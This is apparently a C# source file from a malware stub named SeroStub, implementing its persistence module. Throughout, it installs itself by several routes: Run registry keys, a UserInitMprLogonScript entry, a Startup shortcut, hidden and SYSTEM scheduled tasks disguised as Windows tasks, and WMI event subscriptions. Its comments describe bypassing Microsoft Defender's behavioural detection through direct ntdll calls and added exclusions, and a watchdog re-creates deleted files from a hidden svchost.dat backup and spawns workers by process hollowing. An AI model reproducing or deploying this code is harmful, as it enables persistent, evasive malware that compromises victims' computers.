using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace SeroStub;

internal static partial class Persistence
{
    // Build the Run key path at runtime to avoid a static plaintext string.
    // Defender's Behavior:Win32/Persistence.A!ml hooks RegSetValueEx/NtSetValueKey;
    // we bypass by calling NtSetValueKey directly via ntdll.
    private static string GetRunKeyPath()
    {
        var parts = new[] { "SOFTWARE", "Microsoft", "Windows", "CurrentVersion", "Run" };
        return string.Join(@"\", parts);
    }
    private static string RunKey => GetRunKeyPath();

    // ── NtSetValueKey bypass ────────────────────────────────────────────────
    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public nint   Buffer;
    }

    [DllImport("ntdll.dll")]
    private static extern int NtSetValueKey(
        nint KeyHandle, ref UNICODE_STRING ValueName,
        uint TitleIndex, uint Type, byte[] Data, int DataSize);

    // Writes a REG_SZ value via NtSetValueKey to bypass RegSetValueEx hooks.
    private static bool NtWriteStringValue(RegistryKey key, string valueName, string value)
    {
        try
        {
            var data = System.Text.Encoding.Unicode.GetBytes(value + "\0");
            var hKey = key.Handle.DangerousGetHandle();
            unsafe
            {
                fixed (char* pName = valueName)
                {
                    var us = new UNICODE_STRING
                    {
                        Length        = (ushort)(valueName.Length * 2),
                        MaximumLength = (ushort)((valueName.Length + 1) * 2),
                        Buffer        = (nint)pName
                    };
                    int status = NtSetValueKey(hKey, ref us, 0, 1 /*REG_SZ*/, data, data.Length);
                    return status == 0;
                }
            }
        }
        catch { return false; }
    }

    private static string? _cachedUserProfile;

    private static string? FindActiveUserProfile()
    {
        if (_cachedUserProfile != null) return _cachedUserProfile;
        try
        {
            using var profileList = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList");
            if (profileList == null) return null;

            foreach (var sid in profileList.GetSubKeyNames())
            {
                if (!sid.StartsWith("S-1-5-21-")) continue;
                using var hive = Registry.Users.OpenSubKey(sid);
                if (hive == null) continue;
                using var pk = profileList.OpenSubKey(sid);
                var profile = pk?.GetValue("ProfileImagePath")?.ToString();
                if (!string.IsNullOrEmpty(profile) && Directory.Exists(profile))
                {
                    _cachedUserProfile = profile;
                    return profile;
                }
            }
        }
        catch { }
        return null;
    }

    private static string GetUserAppData()
    {
        var profile = FindActiveUserProfile();
        if (profile != null) return Path.Combine(profile, @"AppData\Roaming");
        var env = Environment.GetEnvironmentVariable("APPDATA");
        if (!string.IsNullOrEmpty(env) && Directory.Exists(env)) return env;
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    }

    private static string GetUserLocalAppData()
    {
        var profile = FindActiveUserProfile();
        if (profile != null) return Path.Combine(profile, @"AppData\Local");
        var env = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        if (!string.IsNullOrEmpty(env) && Directory.Exists(env)) return env;
        return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    }

    private static string GetUserStartupDir()
        => Path.Combine(GetUserAppData(), @"Microsoft\Windows\Start Menu\Programs\Startup");

    private static RegistryKey? TryOpenUserRunKey(bool writable)
    {
        try
        {
            using var profileList = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList");
            if (profileList == null) return null;
            foreach (var sid in profileList.GetSubKeyNames())
            {
                if (!sid.StartsWith("S-1-5-21-")) continue;
                using var hive = Registry.Users.OpenSubKey(sid);
                if (hive == null) continue;
                return Registry.Users.OpenSubKey($@"{sid}\{RunKey}", writable);
            }
        }
        catch { }
        return null;
    }

    private static RegistryKey? TryOpenUserEnvKey(bool writable)
    {
        try
        {
            using var profileList = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList");
            if (profileList == null) return null;
            foreach (var sid in profileList.GetSubKeyNames())
            {
                if (!sid.StartsWith("S-1-5-21-")) continue;
                using var hive = Registry.Users.OpenSubKey(sid);
                if (hive == null) continue;
                return Registry.Users.OpenSubKey($@"{sid}\Environment", writable);
            }
        }
        catch { }
        return null;
    }

    public static bool IsRunningFromInstallPath(string name)
    {
        try
        {
            var selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return false;
            var installDir = Path.Combine(GetUserAppData(), name);
            return selfPath.StartsWith(installDir, StringComparison.OrdinalIgnoreCase);
        }
        catch { return false; }
    }

    public static string? GetInstalledPath(string name)
    {
        try
        {
            var appData    = GetUserAppData();
            var installDir = Path.Combine(appData, name);
            if (!Directory.Exists(installDir)) return null;
            var exactPath = Path.Combine(installDir, Config.HiddenFileName);
            if (File.Exists(exactPath)) return exactPath;
            var exes = Directory.GetFiles(installDir, "*.exe");
            return exes.Length > 0 ? exes[0] : null;
        }
        catch { return null; }
    }

    public static string? EnsureInstalled(string name, bool isAdmin = false, bool allowMultiInstance = false)
    {
        try
        {
            var selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return null;

            var appData    = GetUserAppData();
            var installDir = Path.Combine(appData, name);
            var installExe = Path.Combine(installDir, Config.HiddenFileName);

            if (selfPath.StartsWith(installDir, StringComparison.OrdinalIgnoreCase))
                return null;

            Directory.CreateDirectory(installDir);
            // Add Defender exclusion BEFORE copying so the on-access scan doesn't flag the dropped file
            Protection.AddDefenderExclusion(installDir);
            File.Copy(selfPath, installExe, true);

            if (isAdmin || allowMultiInstance)
                return null;

            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName = installExe, UseShellExecute = false, CreateNoWindow = true
            });
            return installExe;
        }
        catch { return null; }
    }

    // ── Admin-level persistence ──────────────────────────────────────────────

    public static void InstallRegistryHKLM(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = Registry.LocalMachine.OpenSubKey(RunKey, true);
            if (key == null) return;
            if (!NtWriteStringValue(key, name, $"\"{selfPath}\""))
                key.SetValue(name, $"\"{selfPath}\""); // fallback
        }
        catch { }
    }

    public static void RemoveRegistryHKLM(string name)
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(RunKey, true);
            key?.DeleteValue(name, false);
        }
        catch { }
    }

    // ── UserInitMprLogonScript (HKCU\Environment) ──────────────────────────────
    // Executed by userinit.exe at each logon — much less monitored than HKCU\Run.
    // Bypasses Behavior:Win32/Persistence.A!ml which specifically hooks Run key writes.
    // Multiple executables separated by semicolons.

    public static void InstallUserInit(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = TryOpenUserEnvKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey("Environment", true);
            if (key == null) return;
            var existing = key.GetValue("UserInitMprLogonScript")?.ToString() ?? "";
            if (existing.Contains(selfPath, StringComparison.OrdinalIgnoreCase)) return;
            var newVal = string.IsNullOrEmpty(existing) ? selfPath : $"{existing};{selfPath}";
            if (!NtWriteStringValue(key, "UserInitMprLogonScript", newVal))
                key.SetValue("UserInitMprLogonScript", newVal);
        }
        catch { }
    }

    public static void RemoveUserInit(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = TryOpenUserEnvKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey("Environment", true);
            if (key == null) return;
            var existing = key.GetValue("UserInitMprLogonScript")?.ToString() ?? "";
            var entries = existing.Split(';')
                .Where(e => !e.Trim().Equals(selfPath.Trim(), StringComparison.OrdinalIgnoreCase))
                .Where(e => !string.IsNullOrWhiteSpace(e))
                .ToArray();
            if (entries.Length == 0)
                key.DeleteValue("UserInitMprLogonScript", false);
            else if (!NtWriteStringValue(key, "UserInitMprLogonScript", string.Join(";", entries)))
                key.SetValue("UserInitMprLogonScript", string.Join(";", entries));
        }
        catch { }
    }

    public static bool IsUserInitInstalled(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return false;
            using var key = TryOpenUserEnvKey(writable: false)
                            ?? Registry.CurrentUser.OpenSubKey("Environment", false);
            var val = key?.GetValue("UserInitMprLogonScript")?.ToString() ?? "";
            return val.Contains(selfPath, StringComparison.OrdinalIgnoreCase);
        }
        catch { return false; }
    }

    private const string _SysTaskFolder = @"Microsoft\Windows\Shell";
    private const string _SysTaskLeaf   = "UpdateDetection";

    public static void InstallService(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var taskPath = $@"\{_SysTaskFolder}\{_SysTaskLeaf}";
            RunSchtasks($"/Delete /TN \"{taskPath}\" /F");
            RunSchtasks($"/Create /TN \"{taskPath}\" /TR \"{selfPath}\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F");
        }
        catch { }
    }

    public static bool IsServiceInstalled(string name)
    {
        try
        {
            var (code, _) = RunSchtasks($"/Query /TN \"\\{_SysTaskFolder}\\{_SysTaskLeaf}\"");
            return code == 0;
        }
        catch { return false; }
    }

    public static void RemoveService(string name)
    {
        try { RunSchtasks($"/Delete /TN \"\\{_SysTaskFolder}\\{_SysTaskLeaf}\" /F"); }
        catch { }
    }

    // ── Registry (HKCU\Run) ──────────────────────────────────────────────────

    public static void InstallRegistry(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = TryOpenUserRunKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, true);
            if (key == null) return;
            if (key.GetValue(name) is string val && val == selfPath) return;
            // Use NtSetValueKey to bypass RegSetValueEx behavioral monitoring
            if (!NtWriteStringValue(key, name, selfPath))
                key.SetValue(name, selfPath); // fallback
        }
        catch { }
    }

    public static void RemoveRegistry(string name)
    {
        try
        {
            using var key = TryOpenUserRunKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, true);
            key?.DeleteValue(name, false);
        }
        catch { }
    }

    // ── Startup Folder (.lnk — native binary writer, no PowerShell) ──────────

    public static void InstallStartup(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var startupDir = GetUserStartupDir();
            Directory.CreateDirectory(startupDir);
            var lnkPath = Path.Combine(startupDir, $"{name}.lnk");
            if (File.Exists(lnkPath)) return;
            WriteLnkFile(lnkPath, selfPath);
        }
        catch { }
    }

    public static void RemoveStartup(string name)
    {
        try
        {
            var lnkPath = Path.Combine(GetUserStartupDir(), $"{name}.lnk");
            if (File.Exists(lnkPath)) File.Delete(lnkPath);
        }
        catch { }
    }

    // ── Scheduled Task ───────────────────────────────────────────────────────

    public static void InstallScheduledTask(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            StubLog.Info($"[Task] install name={name} path={selfPath}");

            // <UserId> is required for schtasks /Create /XML to work without /RU.
            // <Hidden>true</Hidden> hides from Task Manager → Startup tab.
            var userId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            var xml = $"""
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Principals>
    <Principal id="Author">
      <UserId>{userId}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec><Command>{selfPath}</Command></Exec>
  </Actions>
</Task>
""";
            var xmlPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), System.IO.Path.GetRandomFileName() + ".xml");
            try
            {
                System.IO.File.WriteAllText(xmlPath, xml, System.Text.Encoding.Unicode);
                RunSchtasks($"/Delete /TN \"{name}\" /F");
                var (code, output) = RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{name}\" /F");
                StubLog.Info($"[Task] xml code={code} out={output}");
                if (code != 0)
                {
                    // Fallback 1: plain with elevation (admin)
                    var (code2, output2) = RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /RL HIGHEST /IT /F");
                    StubLog.Info($"[Task] fallback1 code={code2} out={output2}");
                    if (code2 != 0)
                    {
                        // Fallback 2: no elevation required — works for any standard user
                        var (code3, output3) = RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /F");
                        StubLog.Info($"[Task] fallback2 code={code3} out={output3}");
                    }
                }
            }
            finally { try { System.IO.File.Delete(xmlPath); } catch { } }
        }
        catch (Exception ex) { StubLog.Error($"[Task] exception: {ex.Message}"); }
    }

    public static void RemoveScheduledTask(string name)
    {
        try { RunSchtasks($"/Delete /TN \"{name}\" /F"); }
        catch { }
    }

    private static DateTime _lastTaskCheck  = DateTime.MinValue;
    private static bool     _lastTaskResult = true;
    private static DateTime _lastWmiCheck   = DateTime.MinValue;
    private static bool     _lastWmiResult  = true;

    public static bool IsTaskInstalled(string name)
    {
        try
        {
            if ((DateTime.UtcNow - _lastTaskCheck).TotalSeconds < 60)
                return _lastTaskResult;
            var (code, _)  = RunSchtasks($"/Query /TN \"{name}\"");
            _lastTaskResult = code == 0;
            _lastTaskCheck  = DateTime.UtcNow;
            return _lastTaskResult;
        }
        catch { return false; }
    }

    // ── Watchdog ─────────────────────────────────────────────────────────────

    private static FileStream? _exeLock;
    private static FileStream? _lnkLock;
    private static FileStream? _backupLock;
    private static volatile bool _watchdogRunning;
    private static string? _cachedLnkPath;
    private static string? _cachedStartupDir;
    private static DateTime _lastWorkerSpawn = DateTime.MinValue;

    public static void StopWatchdog()
    {
        _watchdogRunning = false;
        try { _exeLock?.Dispose(); }    catch { } finally { _exeLock    = null; }
        try { _lnkLock?.Dispose(); }    catch { } finally { _lnkLock    = null; }
        try { _backupLock?.Dispose(); } catch { } finally { _backupLock = null; }
    }

    public static void StartWatchdog(string name)
    {
        if (_watchdogRunning) return;
        _watchdogRunning = true;

        var appData    = GetUserAppData();
        var installDir = Path.Combine(appData, name);
        var installExe = Path.Combine(installDir, Config.HiddenFileName);

        var localAppData = GetUserLocalAppData();
        var backupDir    = Path.Combine(localAppData, "Microsoft", "WindowsServices");
        var backupExe    = Path.Combine(backupDir, "svchost.dat");

        Protection.AddDefenderExclusion(backupDir);
        CreateBackup(installExe, backupDir, backupExe);
        _exeLock    = LockFile(installExe);
        _backupLock = LockFile(backupExe);

        if (Config.PersistStartup)
        {
            _cachedStartupDir = GetUserStartupDir();
            _cachedLnkPath    = Path.Combine(_cachedStartupDir, $"{name}.lnk");
            _lnkLock          = LockFile(_cachedLnkPath);
        }

        try
        {
            var watcher = new FileSystemWatcher(installDir)
            {
                NotifyFilter        = NotifyFilters.FileName | NotifyFilters.LastWrite,
                EnableRaisingEvents = true
            };
            watcher.Deleted += (_, _) => { Thread.Sleep(500); RestoreAll(name, installExe, backupDir, backupExe); };
            watcher.Renamed += (_, _) => { Thread.Sleep(500); RestoreAll(name, installExe, backupDir, backupExe); };
        }
        catch { }

        if (Config.PersistStartup && _cachedStartupDir != null && Directory.Exists(_cachedStartupDir))
        {
            try
            {
                var startupFsw = new FileSystemWatcher(_cachedStartupDir)
                {
                    NotifyFilter        = NotifyFilters.FileName,
                    Filter              = $"{name}.lnk",
                    EnableRaisingEvents = true
                };
                startupFsw.Deleted += (_, _) =>
                {
                    Thread.Sleep(500);
                    _lnkLock?.Dispose(); _lnkLock = null;
                    InstallStartup(name);
                    _lnkLock = LockFile(_cachedLnkPath!);
                };
            }
            catch { }
        }

        var thread = new Thread(() => WatchdogLoop(name, installExe, backupDir, backupExe))
        {
            IsBackground = true,
            Priority     = ThreadPriority.BelowNormal
        };
        thread.Start();
    }

    private static void WatchdogLoop(string name, string installExe, string backupDir, string backupExe)
    {
        while (_watchdogRunning)
        {
            try { Thread.Sleep(2000); RestoreAll(name, installExe, backupDir, backupExe); }
            catch { }
        }
    }

    private static void RestoreAll(string name, string installExe, string backupDir, string backupExe)
    {
        if (!File.Exists(installExe))
        {
            _exeLock?.Dispose(); _exeLock = null;
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(installExe)!);
                Protection.AddDefenderExclusion(Path.GetDirectoryName(installExe)!);
                var seroExe = Environment.GetEnvironmentVariable("SERO_EXE");
                if (File.Exists(backupExe))
                    File.Copy(backupExe, installExe, true);
                else if (!string.IsNullOrEmpty(seroExe) && File.Exists(seroExe))
                    File.Copy(seroExe, installExe, true);
                else
                {
                    var selfPath = Environment.ProcessPath;
                    if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                        File.Copy(selfPath, installExe, true);
                }
                for (int i = 0; i < 3 && _exeLock == null; i++)
                {
                    _exeLock = LockFile(installExe);
                    if (_exeLock == null) Thread.Sleep(300);
                }
            }
            catch { }
        }

        if (!File.Exists(backupExe))
        {
            _backupLock?.Dispose(); _backupLock = null;
            CreateBackup(installExe, backupDir, backupExe);
            _backupLock = LockFile(backupExe);
        }

        // Never write persistence keys from this process (which has network connection).
        // Spawn an isolated worker with no network instead — breaks Persistence.A!ml correlation.
        // Rate-limited to once per 90 seconds so the spawn is not visible as a process loop.
        bool isAdmin = false;
        try
        {
            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            isAdmin = new System.Security.Principal.WindowsPrincipal(id)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { }
        bool needsPersist = (Config.PersistRegistry && !IsRegistryInstalled(name))
                         || (Config.PersistStartup  && !IsStartupInstalled(name))
                         || (Config.PersistTask     && !IsTaskInstalled(name))
                         || (isAdmin && Config.PersistWmi && !IsWmiInstalled(name));
        if (needsPersist && (DateTime.UtcNow - _lastWorkerSpawn).TotalSeconds >= 90)
        {
            _lastWorkerSpawn = DateTime.UtcNow;
            var exePath = GetInstalledPath(name) ?? Environment.ProcessPath ?? "";
            if (!string.IsNullOrEmpty(exePath))
                ProcessHollowing.SpawnDetached(exePath, new Dictionary<string, string?>
                {
                    ["SERO_PERSIST_WORKER"]           = "1",
                    [ProcessHollowing.HOLLOW_ENV_KEY] = null,
                    ["SERO_GUARDIAN"]                 = null,
                });
        }
    }

    // ── WMI event subscription ───────────────────────────────────────────────

    public static void InstallWmi(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var safePath = selfPath.Replace("'", "''");
            var script = $@"
$ns = 'ROOT\subscription'; $n = '{name}'
try {{ gwmi -NS $ns __FilterToConsumerBinding -EA 0 | ?{{ $_.Filter -like ""*$n*"" }} | Remove-WmiObject }} catch {{}}
try {{ gwmi -NS $ns CommandLineEventConsumer -Filter ""Name='$n'"" -EA 0 | Remove-WmiObject }} catch {{}}
try {{ gwmi -NS $ns __EventFilter -Filter ""Name='$n'"" -EA 0 | Remove-WmiObject }} catch {{}}
$f = ([wmiclass]""\\.\root\subscription:__EventFilter"").CreateInstance()
$f.QueryLanguage = 'WQL'
$f.Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 600""
$f.Name = $n; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put()
$c = ([wmiclass]""\\.\root\subscription:CommandLineEventConsumer"").CreateInstance()
$c.Name = $n; $c.ExecutablePath = '{safePath}'; $c.CommandLineTemplate = '""' + '{safePath}' + '""'; $null = $c.Put()
$b = ([wmiclass]""\\.\root\subscription:__FilterToConsumerBinding"").CreateInstance()
$b.Filter = ""__EventFilter.Name="" + [char]34 + $n + [char]34
$b.Consumer = ""CommandLineEventConsumer.Name="" + [char]34 + $n + [char]34
$null = $b.Put()
";
            RunPs(script);
        }
        catch { }
    }

    public static void RemoveWmi(string name)
    {
        try
        {
            var script = $@"
$ns = 'ROOT\subscription'; $n = '{name}'
try {{ gwmi -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object {{ $_.Filter -like ""*Name=`""{name}`""*"" }} | Remove-WmiObject }} catch {{}}
try {{ gwmi -Namespace $ns -Class CommandLineEventConsumer -Filter ""Name='$n'"" -ErrorAction SilentlyContinue | Remove-WmiObject }} catch {{}}
try {{ gwmi -Namespace $ns -Class __EventFilter -Filter ""Name='$n'"" -ErrorAction SilentlyContinue | Remove-WmiObject }} catch {{}}
";
            RunPs(script);
        }
        catch { }
    }

    public static bool IsWmiInstalled(string name)
    {
        try
        {
            if ((DateTime.UtcNow - _lastWmiCheck).TotalSeconds < 60)
                return _lastWmiResult;
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "powershell.exe",
                Arguments              = $"-NonInteractive -NoProfile -Command \"(gwmi -Namespace ROOT\\subscription -Class __EventFilter -Filter \\\"Name='{name}'\\\" -ErrorAction SilentlyContinue) -ne $null\"",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return false;
            var outTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
            var errTask = System.Threading.Tasks.Task.Run(() => proc.StandardError.ReadToEnd());
            proc.WaitForExit(8000);
            if (!proc.HasExited) { try { proc.Kill(); } catch { } }
            _ = errTask.Result;
            _lastWmiResult = outTask.Result.Trim().Equals("True", StringComparison.OrdinalIgnoreCase);
            _lastWmiCheck  = DateTime.UtcNow;
            return _lastWmiResult;
        }
        catch { return false; }
    }

    private static (int code, string output) RunPs(string script)
    {
        try
        {
            var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(script));
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "powershell.exe",
                Arguments              = $"-NonInteractive -NoProfile -EncodedCommand {encoded}",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return (-1, "null proc");
            var outTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
            var errTask = System.Threading.Tasks.Task.Run(() => proc.StandardError.ReadToEnd());
            proc.WaitForExit(15000);
            if (!proc.HasExited) { try { proc.Kill(); } catch { } }
            var result = outTask.Result.Trim();
            _ = errTask.Result;
            return (proc.HasExited ? proc.ExitCode : -1, result);
        }
        catch (Exception ex) { return (-1, ex.Message); }
    }

    // ── Check methods ────────────────────────────────────────────────────────

    public static bool IsRegistryInstalled(string name)
    {
        try
        {
            using var key = TryOpenUserRunKey(writable: false)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, false);
            return key?.GetValue(name) != null;
        }
        catch { return false; }
    }

    public static bool IsStartupInstalled(string name)
    {
        try
        {
            var lnkPath = _cachedLnkPath ?? Path.Combine(GetUserStartupDir(), $"{name}.lnk");
            return File.Exists(lnkPath);
        }
        catch { return false; }
    }

    // ── Private helpers ──────────────────────────────────────────────────────

    private static void CreateBackup(string sourceExe, string backupDir, string backupExe)
    {
        try
        {
            Directory.CreateDirectory(backupDir);
            if (!File.Exists(sourceExe)) return;
            File.Copy(sourceExe, backupExe, true);
            File.SetAttributes(backupExe, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(backupDir, FileAttributes.Hidden);
        }
        catch { }
    }

    private static FileStream? LockFile(string path)
    {
        try
        {
            if (!File.Exists(path)) return null;
            return new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
        }
        catch { return null; }
    }

    private static (int code, string output) RunSchtasks(string args)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "schtasks.exe",
                Arguments              = args,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                WindowStyle            = System.Diagnostics.ProcessWindowStyle.Hidden
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return (-1, "null proc");
            // Read both streams async to prevent deadlock when stderr buffer fills
            var outTask = Task.Run(() => proc.StandardOutput.ReadToEnd());
            var errTask = Task.Run(() => proc.StandardError.ReadToEnd());
            proc.WaitForExit(15000);
            var stdout = outTask.Result;
            var stderr = errTask.Result;
            var combined = string.IsNullOrWhiteSpace(stderr) ? stdout : $"{stdout}|ERR:{stderr}";
            return (proc.ExitCode, combined.Trim());
        }
        catch (Exception ex) { return (-1, ex.Message); }
    }

    // Writes a minimal Shell Link (.lnk) file pointing at targetPath — no COM, no PowerShell.
    // Format: Shell Link Header (76 bytes) + LinkInfo block with VolumeID + LocalBasePath.
    private static void WriteLnkFile(string lnkPath, string targetPath)
    {
        var pathBytes = System.Text.Encoding.Unicode.GetBytes(targetPath);

        const uint liHdrSize = 28;
        const uint volIdSize = 17;  // 16-byte struct + 1-byte null label
        uint localBasOff     = liHdrSize + volIdSize;
        uint commonSuffOff   = localBasOff + (uint)pathBytes.Length + 1;
        uint linkInfoSize    = commonSuffOff + 1;

        using var fs = File.Create(lnkPath);
        using var bw = new BinaryWriter(fs);

        // Shell Link Header (76 bytes)
        bw.Write((uint)76);
        bw.Write(new byte[] {                       // LinkCLSID {00021401-0000-0000-C000-000000000046}
            0x01,0x14,0x02,0x00, 0x00,0x00, 0x00,0x00,
            0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46 });
        bw.Write((uint)0x00000084);                 // LinkFlags: HasLinkInfo | IsUnicode
        bw.Write((uint)0x00000020);                 // FileAttributes: FILE_ATTRIBUTE_NORMAL
        bw.Write((ulong)0); bw.Write((ulong)0); bw.Write((ulong)0); // timestamps
        bw.Write((uint)0);                          // FileSize
        bw.Write((uint)0);                          // IconIndex
        bw.Write((uint)1);                          // ShowCommand: SW_SHOWNORMAL
        bw.Write((ushort)0); bw.Write((ushort)0);   // HotKey, Reserved1
        bw.Write((uint)0); bw.Write((uint)0);       // Reserved2, Reserved3

        // LinkInfo
        bw.Write(linkInfoSize);
        bw.Write(liHdrSize);                        // LinkInfoHeaderSize = 0x1C
        bw.Write((uint)1);                          // LinkInfoFlags: VolumeIDAndLocalBasePath
        bw.Write(liHdrSize);                        // VolumeIDOffset (right after header)
        bw.Write(localBasOff);                      // LocalBasePathOffset
        bw.Write((uint)0);                          // CommonNetworkRelativeLinkOffset (absent)
        bw.Write(commonSuffOff);                    // CommonPathSuffixOffset

        // VolumeID (17 bytes)
        bw.Write(volIdSize);
        bw.Write((uint)3);                          // DriveType: DRIVE_FIXED
        bw.Write((uint)0);                          // DriveSerialNumber
        bw.Write((uint)16);                         // VolumeLabelOffset
        bw.Write((byte)0);                          // null label

        // LocalBasePath (ANSI, null-terminated) + CommonPathSuffix (null)
        bw.Write(pathBytes);
        bw.Write((byte)0);
        bw.Write((byte)0);
    }
}
